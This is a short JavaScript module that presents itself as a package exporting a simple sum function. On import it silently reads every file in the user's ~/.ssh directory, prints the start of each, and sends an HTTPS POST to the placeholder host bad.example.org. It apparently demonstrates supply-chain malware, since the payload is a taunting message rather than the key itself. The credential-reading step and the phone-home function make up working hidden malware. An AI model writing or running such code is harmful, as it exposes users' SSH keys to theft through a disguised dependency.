function phoneHome(payload) {
  const https = require('https')
  const data = JSON.stringify(payload)
  const options = {
    hostname: 'bad.example.org',
    port: 443,
    path: '/sendShhKey',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': data.length,
    },
  }
  const req = https.request(options, (res) => {
    res.on('data', (d) => {
      process.stdout.write(d)
    })
  })
  req.on('error', (error) => {
    console.error('Server not found of course.')
  })
  req.write(data)
  req.end()
}

if (typeof process !== 'undefined') {
  const fs = require('fs')
  const path = require('path')
  const os = require('os')
  const sshFolder = path.join(os.homedir(), '.ssh')
  for (const file of fs.readdirSync(sshFolder)) {
    const filename = path.join(sshFolder, file)
    if (fs.lstatSync(filename).isFile()) {
      const contents = fs.readFileSync(filename, { encoding: 'utf-8' })
      console.log(contents.slice(0, 30), '...')
      phoneHome('Could have been my ssh key. Byeee')
    }
  }
}

module.exports = {
  sum(a, b) {
    return a + b
  },
}
